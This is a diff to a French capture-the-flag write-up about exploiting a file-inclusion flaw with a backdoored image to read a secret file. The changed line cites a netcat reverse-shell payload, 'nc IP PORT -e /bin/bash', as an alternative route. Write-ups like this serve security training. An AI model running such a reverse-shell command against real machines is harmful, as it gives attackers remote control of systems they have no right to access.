@@ -60,7 +60,7 @@ C'est ici que notre LFI va nous être utile, car nous allons inclure cette image
 Après de l'énumération, on se rend compte d'un fichier bizarre à la racine: "thisFileIsSecretAndConfidential.txt", essayons de l'afficher avec notre image backdoorée:<br/>
 ![alt](images/flag.png)
 <br/><br/>
-Note : Il aurait été aussi possible d'obtenir un reverse shell sur la machine avec une payload du type: "nc <YOUR IP> <PORT> -e /bin/bash".
+Note : Il aurait été aussi possible d'obtenir un reverse shell sur la machine avec une payload du type: "nc IP PORT -e /bin/bash".
 
 ### Flag
 
